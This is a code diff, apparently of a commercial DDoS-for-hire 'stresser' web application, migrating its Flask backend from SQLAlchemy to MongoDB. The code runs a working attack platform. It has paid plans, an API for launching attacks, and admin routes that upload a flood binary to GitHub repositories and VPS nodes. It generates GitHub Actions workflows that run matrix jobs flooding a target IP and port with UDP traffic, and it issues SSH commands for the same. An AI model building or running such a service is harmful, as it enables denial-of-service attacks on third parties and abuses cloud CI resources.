@@ -11,14 +11,24 @@ from github import Github, GithubException
 from datetime import datetime, timedelta
 from functools import wraps
 from flask import Flask, render_template_string, request, redirect, url_for, flash, session, jsonify
-from flask_sqlalchemy import SQLAlchemy
+from pymongo import MongoClient
+from bson.objectid import ObjectId
+from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("InfernoCore", secrets.token_urlsafe(32))
-app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL", "sqlite:///stresser.db")
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-db = SQLAlchemy(app)
-YML_FILE_PATH = ".github/workflows/main.yml"
+app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
+
+# ---------- MongoDB Connection ----------
+MONGO_URL = os.environ.get("MONGO_URL", "mongodb://localhost:27017/")
+client = MongoClient(MONGO_URL)
+db = client['stresser_db']
+
+# Collections
+users_col = db['users']
+api_keys_col = db['api_keys']
+attack_logs_col = db['attack_logs']
+attack_nodes_col = db['attack_nodes']
+admin_users_col = db['admin_users']
 
 # ---------- Captcha Helper ----------
 def generate_captcha():
@@ -69,84 +79,38 @@ def get_random_proxy():
 
 fetch_proxies()
 
-# ---------- Database Models ----------
-class User(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    token = db.Column(db.String(128), unique=True, nullable=False)
-    plan = db.Column(db.String(50), default="Free Plan")
-    max_concurrent = db.Column(db.Integer, default=1)
-    max_duration = db.Column(db.Integer, default=60)
-    slots_used = db.Column(db.Integer, default=0)
-    total_attacks = db.Column(db.Integer, default=0)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
-
-class ApiKey(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
-    key = db.Column(db.String(64), unique=True, nullable=False)
-    name = db.Column(db.String(100), default="Default")
-    whitelist_ips = db.Column(db.Text, default="")
-    expires_at = db.Column(db.DateTime, nullable=True)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
-    user = db.relationship('User', backref=db.backref('api_keys', lazy=True))
-
-class AttackLog(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
-    target = db.Column(db.String(100))
-    port = db.Column(db.Integer)
-    duration = db.Column(db.Integer)
-    method = db.Column(db.String(50), default="UDP")
-    concurrent = db.Column(db.Integer, default=1)
-    status = db.Column(db.String(20), default='running')
-    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
-    user = db.relationship('User', backref=db.backref('attacks', lazy=True))
-
-class AttackNode(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    name = db.Column(db.String(100), nullable=False)
-    node_type = db.Column(db.String(20), nullable=False)
-    enabled = db.Column(db.Boolean, default=True)
-    github_token = db.Column(db.String(200), nullable=True)
-    github_repo = db.Column(db.String(200), nullable=True)
-    vps_host = db.Column(db.String(100), nullable=True)
-    vps_port = db.Column(db.Integer, default=22)
-    vps_username = db.Column(db.String(100), nullable=True)
-    vps_password = db.Column(db.String(200), nullable=True)
-    vps_key_path = db.Column(db.String(200), nullable=True)
-    last_status = db.Column(db.String(50), default="unknown")
-    binary_present = db.Column(db.Boolean, default=False)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
-
-class AdminUser(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80), unique=True, nullable=False)
-    password_hash = db.Column(db.String(200), nullable=False)
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
-
-with app.app_context():
-    db.create_all()
-    if not AdminUser.query.filter_by(username='admin').first():
-        from werkzeug.security import generate_password_hash
-        default_admin = AdminUser(
-            username='admin',
-            password_hash=generate_password_hash('admin123')
-        )
-        db.session.add(default_admin)
-        db.session.commit()
+# ---------- Database Initialisation ----------
+def init_db():
+    # Create admin user if none exists
+    if admin_users_col.count_documents({}) == 0:
+        admin_users_col.insert_one({
+            "username": "admin",
+            "password_hash": generate_password_hash("admin123"),
+            "created_at": datetime.utcnow()
+        })
         print("Default admin created: username 'admin', password 'admin123'")
-    if not User.query.first():
+    # Create default user if none exists
+    if users_col.count_documents({}) == 0:
         default_token = secrets.token_urlsafe(32)
-        default_user = User(token=default_token, plan="Free Plan", max_concurrent=1, max_duration=60)
-        db.session.add(default_user)
-        db.session.commit()
+        users_col.insert_one({
+            "token": default_token,
+            "plan": "Free Plan",
+            "max_concurrent": 1,
+            "max_duration": 60,
+            "slots_used": 0,
+            "total_attacks": 0,
+            "created_at": datetime.utcnow()
+        })
         print(f"Default user token: {default_token}")
 
+init_db()
+
+# ---------- Helper Functions ----------
 def generate_token():
     return secrets.token_urlsafe(32)
 
 def get_user_by_token(token):
-    return User.query.filter_by(token=token).first()
+    return users_col.find_one({"token": token})
 
 def admin_required(f):
     @wraps(f)
@@ -178,60 +142,55 @@ def create_github_repository(token, repo_name="InfernoCore"):
 
 def test_github_node(node):
     try:
-        g = Github(node.github_token)
+        g = Github(node['github_token'])
         user = g.get_user()
-        repo = g.get_repo(node.github_repo)
-        node.last_status = "online"
+        repo = g.get_repo(node['github_repo'])
+        node['last_status'] = "online"
         try:
             repo.get_contents("soul")
-            node.binary_present = True
+            node['binary_present'] = True
         except:
-            node.binary_present = False
-        db.session.commit()
+            node['binary_present'] = False
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online", "binary_present": node['binary_present']}})
         return True, "GitHub OK"
     except Exception as e:
-        node.last_status = "offline"
-        node.binary_present = False
-        db.session.commit()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
         return False, str(e)
 
 def test_vps_node(node):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_key_path and os.path.exists(node.vps_key_path):
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=5)
-        elif node.vps_password:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        password=node.vps_password, timeout=5)
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=5)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=5)
         else:
             return False, "No authentication method"
         stdin, stdout, stderr = ssh.exec_command("test -f /root/soul && echo 'exists'")
         output = stdout.read().decode().strip()
         ssh.close()
-        node.last_status = "online"
-        node.binary_present = (output == 'exists')
-        db.session.commit()
-        return True, "SSH OK" + (" (binary found)" if node.binary_present else " (binary missing)")
+        node['last_status'] = "online"
+        node['binary_present'] = (output == 'exists')
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online", "binary_present": node['binary_present']}})
+        return True, "SSH OK" + (" (binary found)" if node['binary_present'] else " (binary missing)")
     except Exception as e:
-        node.last_status = "offline"
-        node.binary_present = False
-        db.session.commit()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
         return False, str(e)
 
 # ---------- Binary Distribution ----------
 def distribute_binary_to_github(node, binary_data):
     try:
-        g = Github(node.github_token)
-        repo = g.get_repo(node.github_repo)
+        g = Github(node['github_token'])
+        repo = g.get_repo(node['github_repo'])
         try:
             contents = repo.get_contents("soul")
             repo.update_file("soul", "Update binary", binary_data, contents.sha, branch="main")
         except:
             repo.create_file("soul", "Add binary", binary_data, branch="main")
-        node.binary_present = True
-        db.session.commit()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
         return True
     except Exception as e:
         print(e)
@@ -241,23 +200,26 @@ def distribute_binary_to_vps(node, binary_data):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_key_path and os.path.exists(node.vps_key_path):
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=10)
-        elif node.vps_password:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        password=node.vps_password, timeout=10)
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=10)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=10)
         else:
             return False
         sftp = ssh.open_sftp()
         remote_path = "/root/soul"
+        try:
+            sftp.stat("/root")
+        except:
+            sftp.mkdir("/root")
         with sftp.open(remote_path, 'wb') as f:
             f.write(binary_data)
         sftp.chmod(remote_path, 0o755)
         sftp.close()
         ssh.close()
-        node.binary_present = True
-        db.session.commit()
+        attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
         return True
     except Exception as e:
         print(e)
@@ -265,37 +227,33 @@ def distribute_binary_to_vps(node, binary_data):
 
 # ---------- Attack Triggers ----------
 def trigger_github_node(node, target, port, duration, method):
-    # Always use UDP
     binary_method = "udp"
     matrix_size = 10
+    matrix_list = ','.join(str(i) for i in range(1, matrix_size+1))
     yml_content = f"""name: Inferno Attack
 on: [push]
 
 jobs:
-
   stage-0-init:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [{', '.join(str(i) for i in range(1, matrix_size+1))}]
+        n: [{matrix_list}]
     steps:
       - uses: actions/checkout@v3
-      - name: Make binary executable
-        run: chmod +x soul
-      - name: Initial attack burst (10s)
-        run: ./soul {target} {port} 10 {binary_method}
+      - run: chmod +x soul
+      - run: ./soul {target} {port} 10 {binary_method}
 
   stage-1-main:
     needs: stage-0-init
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [{', '.join(str(i) for i in range(1, matrix_size+1))}]
+        n: [{matrix_list}]
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - name: Main attack
-        run: ./soul {target} {port} {duration} {binary_method}
+      - run: ./soul {target} {port} {duration} {binary_method}
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -318,22 +276,19 @@ jobs:
         iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
     steps:
       - uses: actions/checkout@v3
-      - name: Sequential 10s burst
-        run: |
-          chmod +x soul
-          ./soul {target} {port} 10 {binary_method}
+      - run: chmod +x soul
+      - run: ./soul {target} {port} 10 {binary_method}
 
   stage-3-cleanup:
     needs: [stage-1-main, stage-2-sequential]
     runs-on: ubuntu-22.04
     if: always()
     steps:
-      - name: Attack finished
-        run: echo "Attack completed on $(date)"
+      - run: echo "Attack completed on $(date)"
 """
     try:
-        g = Github(node.github_token)
-        repo = g.get_repo(node.github_repo)
+        g = Github(node['github_token'])
+        repo = g.get_repo(node['github_repo'])
         try:
             contents = repo.get_contents(".github/workflows/main.yml")
             repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
@@ -349,12 +304,12 @@ def trigger_vps_node(node, target, port, duration, method):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_key_path and os.path.exists(node.vps_key_path):
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=10)
-        elif node.vps_password:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        password=node.vps_password, timeout=10)
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        key_filename=node['vps_key_path'], timeout=10)
+        elif node.get('vps_password'):
+            ssh.connect(node['vps_host'], port=node['vps_port'], username=node['vps_username'],
+                        password=node['vps_password'], timeout=10)
         else:
             return False
         cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
@@ -378,36 +333,41 @@ def run_local_python(target, port, duration, method):
     return packets
 
 def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
-    nodes = AttackNode.query.filter_by(enabled=True).all()
+    nodes = list(attack_nodes_col.find({"enabled": True}))
     if not nodes:
         packets = run_local_python(target, port, duration, method)
-        with app.app_context():
-            log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
-                            method=method, concurrent=1, status='completed')
-            db.session.add(log)
-            db.session.commit()
-            if user_id:
-                user = User.query.get(user_id)
-                if user:
-                    user.total_attacks += 1
-                    user.slots_used = max(0, user.slots_used - 1)
-                    db.session.commit()
+        log = {
+            "user_id": user_id,
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "method": method,
+            "concurrent": 1,
+            "status": "completed",
+            "timestamp": datetime.utcnow()
+        }
+        attack_logs_col.insert_one(log)
+        if user_id:
+            users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -1}})
         return
 
-    with app.app_context():
-        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
-                        method=method, concurrent=len(nodes))
-        db.session.add(log)
-        db.session.commit()
-        if user_id:
-            user = User.query.get(user_id)
-            if user:
-                user.total_attacks += 1
-                db.session.commit()
+    log = {
+        "user_id": user_id,
+        "target": target,
+        "port": port,
+        "duration": duration,
+        "method": method,
+        "concurrent": len(nodes),
+        "status": "running",
+        "timestamp": datetime.utcnow()
+    }
+    log_id = attack_logs_col.insert_one(log).inserted_id
+    if user_id:
+        users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1}})
 
     threads = []
     def worker(node):
-        if node.node_type == 'github':
+        if node['node_type'] == 'github':
             trigger_github_node(node, target, port, duration, method)
         else:
             trigger_vps_node(node, target, port, duration, method)
@@ -418,9 +378,7 @@ def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
     for t in threads:
         t.join()
 
-    with app.app_context():
-        log.status = 'completed'
-        db.session.commit()
+    attack_logs_col.update_one({"_id": log_id}, {"$set": {"status": "completed"}})
 
 # ---------- User Routes ----------
 @app.route('/')
@@ -444,7 +402,7 @@ def login():
         user = get_user_by_token(token)
         if user:
             session['user_token'] = token
-            session['user_id'] = user.id
+            session['user_id'] = str(user['_id'])
             flash('Logged in successfully', 'success')
             return redirect(url_for('dashboard'))
         flash('Invalid token', 'danger')
@@ -465,9 +423,16 @@ def register():
             session['captcha_answer'] = a
             return render_template_string(REGISTER_HTML, captcha_question=q)
         token = generate_token()
-        user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60)
-        db.session.add(user)
-        db.session.commit()
+        user = {
+            "token": token,
+            "plan": "Free Plan",
+            "max_concurrent": 1,
+            "max_duration": 60,
+            "slots_used": 0,
+            "total_attacks": 0,
+            "created_at": datetime.utcnow()
+        }
+        users_col.insert_one(user)
         flash(f'Your access token: {token}', 'success')
         return redirect(url_for('login'))
     q, a = generate_captcha()
@@ -479,13 +444,13 @@ def register():
 def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('login'))
-    user = User.query.get(session['user_id'])
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
     if not user:
         session.clear()
         return redirect(url_for('login'))
-    attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
-    slots_used = user.slots_used
-    max_slots = user.max_concurrent
+    attacks = list(attack_logs_col.find({"user_id": session['user_id']}).sort("timestamp", -1).limit(10))
+    slots_used = user.get('slots_used', 0)
+    max_slots = user.get('max_concurrent', 1)
     return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks,
                                   slots_used=slots_used, max_slots=max_slots)
 
@@ -493,25 +458,24 @@ def dashboard():
 def attack_page():
     if 'user_id' not in session:
         return redirect(url_for('login'))
-    user = User.query.get(session['user_id'])
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
     if request.method == 'POST':
         target = request.form.get('target')
         port = int(request.form.get('port'))
         duration = int(request.form.get('duration'))
         method = request.form.get('method', 'UDP')
         concurrent = int(request.form.get('concurrent', 1))
-        if duration > user.max_duration:
-            flash(f'Duration exceeds limit ({user.max_duration}s)', 'danger')
+        if duration > user['max_duration']:
+            flash(f'Duration exceeds limit ({user["max_duration"]}s)', 'danger')
             return redirect(url_for('attack_page'))
-        if concurrent > user.max_concurrent:
-            flash(f'Concurrent exceeds limit ({user.max_concurrent})', 'danger')
+        if concurrent > user['max_concurrent']:
+            flash(f'Concurrent exceeds limit ({user["max_concurrent"]})', 'danger')
             return redirect(url_for('attack_page'))
-        if user.slots_used + concurrent > user.max_concurrent:
+        if user.get('slots_used', 0) + concurrent > user['max_concurrent']:
             flash('No free slots', 'danger')
             return redirect(url_for('attack_page'))
-        user.slots_used += concurrent
-        db.session.commit()
-        thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'web'))
+        users_col.update_one({"_id": user['_id']}, {"$inc": {"slots_used": concurrent}})
+        thread = threading.Thread(target=run_attack_on_nodes, args=(user['_id'], target, port, duration, method, 'web'))
         thread.daemon = True
         thread.start()
         flash(f'Attack launched on {target}:{port} ({method})', 'success')
@@ -522,7 +486,7 @@ def attack_page():
 def products_page():
     if 'user_id' not in session:
         return redirect(url_for('login'))
-    user = User.query.get(session['user_id'])
+    user = users_col.find_one({"_id": ObjectId(session['user_id'])})
     plans = [
         {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
         {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP Only', 'slots': 5},
@@ -544,25 +508,26 @@ def api_attack():
     concurrent = data.get('concurrent', 1)
     if not api_key or not target or not port or not duration:
         return jsonify({'error': 'Missing parameters'}), 400
-    key_obj = ApiKey.query.filter_by(key=api_key).first()
+    key_obj = api_keys_col.find_one({"key": api_key})
     if not key_obj:
         return jsonify({'error': 'Invalid API key'}), 401
-    if key_obj.expires_at and datetime.utcnow() > key_obj.expires_at:
+    if key_obj.get('expires_at') and datetime.utcnow() > key_obj['expires_at']:
         return jsonify({'error': 'API key expired'}), 403
-    if key_obj.whitelist_ips:
-        allowed_ips = [ip.strip() for ip in key_obj.whitelist_ips.split(',')]
+    if key_obj.get('whitelist_ips'):
+        allowed_ips = [ip.strip() for ip in key_obj['whitelist_ips'].split(',')]
         if request.remote_addr not in allowed_ips:
             return jsonify({'error': 'IP not whitelisted'}), 403
-    user = key_obj.user
-    if duration > user.max_duration:
-        return jsonify({'error': f'Duration exceeds {user.max_duration}s'}), 400
-    if concurrent > user.max_concurrent:
-        return jsonify({'error': f'Concurrent exceeds {user.max_concurrent}'}), 400
-    if user.slots_used + concurrent > user.max_concurrent:
+    user = users_col.find_one({"_id": key_obj['user_id']})
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    if duration > user['max_duration']:
+        return jsonify({'error': f'Duration exceeds {user["max_duration"]}s'}), 400
+    if concurrent > user['max_concurrent']:
+        return jsonify({'error': f'Concurrent exceeds {user["max_concurrent"]}'}), 400
+    if user.get('slots_used', 0) + concurrent > user['max_concurrent']:
         return jsonify({'error': 'No free slots'}), 429
-    user.slots_used += concurrent
-    db.session.commit()
-    thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'api'))
+    users_col.update_one({"_id": user['_id']}, {"$inc": {"slots_used": concurrent}})
+    thread = threading.Thread(target=run_attack_on_nodes, args=(user['_id'], target, port, duration, method, 'api'))
     thread.daemon = True
     thread.start()
     return jsonify({'status': 'started', 'message': 'Attack started'}), 200
@@ -573,9 +538,8 @@ def admin_login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        from werkzeug.security import check_password_hash
-        admin = AdminUser.query.filter_by(username=username).first()
-        if admin and check_password_hash(admin.password_hash, password):
+        admin = admin_users_col.find_one({"username": username})
+        if admin and check_password_hash(admin['password_hash'], password):
             session['admin_logged_in'] = True
             session['admin_username'] = username
             flash('Admin logged in successfully', 'success')
@@ -593,12 +557,12 @@ def admin_logout():
 @app.route('/admin/dashboard')
 @admin_required
 def admin_dashboard():
-    total_users = User.query.count()
-    total_attacks = AttackLog.query.count()
-    total_nodes = AttackNode.query.count()
-    active_nodes = AttackNode.query.filter_by(enabled=True).count()
-    recent_attacks = AttackLog.query.order_by(AttackLog.timestamp.desc()).limit(10).all()
-    users = User.query.order_by(User.created_at.desc()).limit(20).all()
+    total_users = users_col.count_documents({})
+    total_attacks = attack_logs_col.count_documents({})
+    total_nodes = attack_nodes_col.count_documents({})
+    active_nodes = attack_nodes_col.count_documents({"enabled": True})
+    recent_attacks = list(attack_logs_col.find().sort("timestamp", -1).limit(10))
+    users = list(users_col.find().sort("created_at", -1).limit(20))
     return render_template_string(ADMIN_DASHBOARD_HTML,
                                   total_users=total_users,
                                   total_attacks=total_attacks,
@@ -626,54 +590,51 @@ def admin_attack():
 @app.route('/admin/users')
 @admin_required
 def admin_users():
-    users = User.query.order_by(User.created_at.desc()).all()
+    users = list(users_col.find().sort("created_at", -1))
     return render_template_string(ADMIN_USERS_HTML, users=users)
 
-@app.route('/admin/users/<int:user_id>/edit', methods=['POST'])
+@app.route('/admin/users/<user_id>/edit', methods=['POST'])
 @admin_required
 def admin_edit_user(user_id):
-    user = User.query.get(user_id)
+    user = users_col.find_one({"_id": ObjectId(user_id)})
     if not user:
         flash('User not found', 'danger')
         return redirect(url_for('admin_users'))
     action = request.form.get('action')
     if action == 'set_limit':
         new_limit = int(request.form.get('max_concurrent', 1))
-        user.max_concurrent = new_limit
-        db.session.commit()
-        flash(f'User {user.id} limit set to {new_limit}', 'success')
+        users_col.update_one({"_id": ObjectId(user_id)}, {"$set": {"max_concurrent": new_limit}})
+        flash(f'User {user_id} limit set to {new_limit}', 'success')
     elif action == 'reset_token':
         new_token = generate_token()
-        user.token = new_token
-        db.session.commit()
-        flash(f'User {user.id} token reset: {new_token}', 'success')
+        users_col.update_one({"_id": ObjectId(user_id)}, {"$set": {"token": new_token}})
+        flash(f'User {user_id} token reset: {new_token}', 'success')
     elif action == 'delete':
-        db.session.delete(user)
-        db.session.commit()
-        flash(f'User {user.id} deleted', 'success')
+        users_col.delete_one({"_id": ObjectId(user_id)})
+        flash(f'User {user_id} deleted', 'success')
     return redirect(url_for('admin_users'))
 
 @app.route('/admin/attacks')
 @admin_required
 def admin_attacks():
-    attacks = AttackLog.query.order_by(AttackLog.timestamp.desc()).limit(100).all()
+    attacks = list(attack_logs_col.find().sort("timestamp", -1).limit(100))
     return render_template_string(ADMIN_ATTACKS_HTML, attacks=attacks)
 
 @app.route('/admin/api_keys')
 @admin_required
 def admin_api_keys():
-    keys = ApiKey.query.all()
-    users = {u.id: u.username for u in User.query.all()}
+    keys = list(api_keys_col.find())
+    users = {str(u['_id']): u['token'][:16] for u in users_col.find()}
     return render_template_string(ADMIN_API_KEYS_HTML, keys=keys, users=users)
 
 @app.route('/admin/api_keys/create', methods=['POST'])
 @admin_required
 def admin_create_api_key():
-    user_id = int(request.form.get('user_id'))
+    user_id = request.form.get('user_id')
     name = request.form.get('name', 'API Key')
     whitelist_ips = request.form.get('whitelist_ips', '')
     expires_days = request.form.get('expires_days')
-    user = User.query.get(user_id)
+    user = users_col.find_one({"_id": ObjectId(user_id)})
     if not user:
         flash('User not found', 'danger')
         return redirect(url_for('admin_api_keys'))
@@ -681,26 +642,29 @@ def admin_create_api_key():
     expires_at = None
     if expires_days and expires_days.isdigit():
         expires_at = datetime.utcnow() + timedelta(days=int(expires_days))
-    api_key = ApiKey(user_id=user.id, key=new_key, name=name, whitelist_ips=whitelist_ips, expires_at=expires_at)
-    db.session.add(api_key)
-    db.session.commit()
+    api_key = {
+        "user_id": ObjectId(user_id),
+        "key": new_key,
+        "name": name,
+        "whitelist_ips": whitelist_ips,
+        "expires_at": expires_at,
+        "created_at": datetime.utcnow()
+    }
+    api_keys_col.insert_one(api_key)
     flash(f'API key created: {new_key}', 'success')
     return redirect(url_for('admin_api_keys'))
 
-@app.route('/admin/api_keys/<int:key_id>/delete', methods=['POST'])
+@app.route('/admin/api_keys/<key_id>/delete', methods=['POST'])
 @admin_required
 def admin_delete_api_key(key_id):
-    key = ApiKey.query.get(key_id)
-    if key:
-        db.session.delete(key)
-        db.session.commit()
-        flash('API key deleted', 'success')
+    api_keys_col.delete_one({"_id": ObjectId(key_id)})
+    flash('API key deleted', 'success')
     return redirect(url_for('admin_api_keys'))
 
 @app.route('/admin/nodes')
 @admin_required
 def admin_nodes():
-    nodes = AttackNode.query.all()
+    nodes = list(attack_nodes_col.find())
     return render_template_string(ADMIN_NODES_HTML, nodes=nodes)
 
 @app.route('/admin/nodes/add_github', methods=['POST'])
@@ -715,16 +679,17 @@ def admin_add_github_node():
         return redirect(url_for('admin_nodes'))
     try:
         repo, created = create_github_repository(token, repo_name)
-        node = AttackNode(
-            name=name,
-            node_type='github',
-            enabled=enabled,
-            github_token=token,
-            github_repo=f"{repo.owner.login}/{repo_name}"
-        )
-        db.session.add(node)
-        db.session.commit()
-        test_github_node(node)
+        node = {
+            "name": name,
+            "node_type": "github",
+            "enabled": enabled,
+            "github_token": token,
+            "github_repo": f"{repo.owner.login}/{repo_name}",
+            "last_status": "unknown",
+            "binary_present": False,
+            "created_at": datetime.utcnow()
+        }
+        attack_nodes_col.insert_one(node)
         flash(f'GitHub node added! Repository {"created" if created else "already exists"}', 'success')
     except Exception as e:
         flash(f'Error: {str(e)}', 'danger')
@@ -753,59 +718,59 @@ def admin_add_vps_node():
             key_path = os.path.join(key_dir, safe_name)
             file.save(key_path)
             os.chmod(key_path, 0o600)
-    node = AttackNode(
-        name=name,
-        node_type='vps',
-        enabled=enabled,
-        vps_host=host,
-        vps_port=port,
-        vps_username=username,
-        vps_password=password,
-        vps_key_path=key_path
-    )
-    db.session.add(node)
-    db.session.commit()
-    test_vps_node(node)
+    node = {
+        "name": name,
+        "node_type": "vps",
+        "enabled": enabled,
+        "vps_host": host,
+        "vps_port": port,
+        "vps_username": username,
+        "vps_password": password,
+        "vps_key_path": key_path,
+        "last_status": "unknown",
+        "binary_present": False,
+        "created_at": datetime.utcnow()
+    }
+    attack_nodes_col.insert_one(node)
     flash('VPS node added', 'success')
     return redirect(url_for('admin_nodes'))
 
-@app.route('/admin/nodes/<int:node_id>/check', methods=['POST'])
+@app.route('/admin/nodes/<node_id>/check', methods=['POST'])
 @admin_required
 def admin_check_node(node_id):
-    node = AttackNode.query.get(node_id)
+    node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
     if node:
-        if node.node_type == 'github':
+        if node['node_type'] == 'github':
             ok, msg = test_github_node(node)
         else:
             ok, msg = test_vps_node(node)
         if ok:
-            flash(f'Node {node.name} is online: {msg}', 'success')
+            flash(f'Node {node["name"]} is online: {msg}', 'success')
         else:
-            flash(f'Node {node.name} is offline: {msg}', 'danger')
+            flash(f'Node {node["name"]} is offline: {msg}', 'danger')
     return redirect(url_for('admin_nodes'))
 
-@app.route('/admin/nodes/<int:node_id>/toggle', methods=['POST'])
+@app.route('/admin/nodes/<node_id>/toggle', methods=['POST'])
 @admin_required
 def admin_toggle_node(node_id):
-    node = AttackNode.query.get(node_id)
+    node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
     if node:
-        node.enabled = not node.enabled
-        db.session.commit()
-        flash(f'Node {node.name} toggled', 'success')
+        new_enabled = not node['enabled']
+        attack_nodes_col.update_one({"_id": ObjectId(node_id)}, {"$set": {"enabled": new_enabled}})
+        flash(f'Node {node["name"]} toggled', 'success')
     return redirect(url_for('admin_nodes'))
 
-@app.route('/admin/nodes/<int:node_id>/delete', methods=['POST'])
+@app.route('/admin/nodes/<node_id>/delete', methods=['POST'])
 @admin_required
 def admin_delete_node(node_id):
-    node = AttackNode.query.get(node_id)
+    node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
     if node:
-        if node.vps_key_path and os.path.exists(node.vps_key_path):
+        if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
             try:
-                os.remove(node.vps_key_path)
+                os.remove(node['vps_key_path'])
             except:
                 pass
-        db.session.delete(node)
-        db.session.commit()
+        attack_nodes_col.delete_one({"_id": ObjectId(node_id)})
         flash('Node deleted', 'success')
     return redirect(url_for('admin_nodes'))
 
@@ -820,10 +785,10 @@ def admin_upload_binary():
         flash('No file selected', 'danger')
         return redirect(url_for('admin_nodes'))
     binary_data = file.read()
-    nodes = AttackNode.query.filter_by(enabled=True).all()
+    nodes = list(attack_nodes_col.find({"enabled": True}))
     success_count = 0
     for node in nodes:
-        if node.node_type == 'github':
+        if node['node_type'] == 'github':
             if distribute_binary_to_github(node, binary_data):
                 success_count += 1
         else:
@@ -838,16 +803,32 @@ def admin_settings():
     if request.method == 'POST':
         new_admin_pass = request.form.get('new_admin_password')
         if new_admin_pass and len(new_admin_pass) >= 6:
-            from werkzeug.security import generate_password_hash
-            admin = AdminUser.query.filter_by(username='admin').first()
-            if admin:
-                admin.password_hash = generate_password_hash(new_admin_pass)
-                db.session.commit()
-                flash('Admin password changed', 'success')
+            admin_users_col.update_one({"username": "admin"}, {"$set": {"password_hash": generate_password_hash(new_admin_pass)}})
+            flash('Admin password changed', 'success')
         else:
             flash('Password must be at least 6 characters', 'danger')
+        # Clear collection actions
+        if request.form.get('clear_users'):
+            users_col.delete_many({})
+            flash('All users cleared', 'success')
+        if request.form.get('clear_api_keys'):
+            api_keys_col.delete_many({})
+            flash('All API keys cleared', 'success')
+        if request.form.get('clear_attack_logs'):
+            attack_logs_col.delete_many({})
+            flash('All attack logs cleared', 'success')
+        if request.form.get('clear_nodes'):
+            attack_nodes_col.delete_many({})
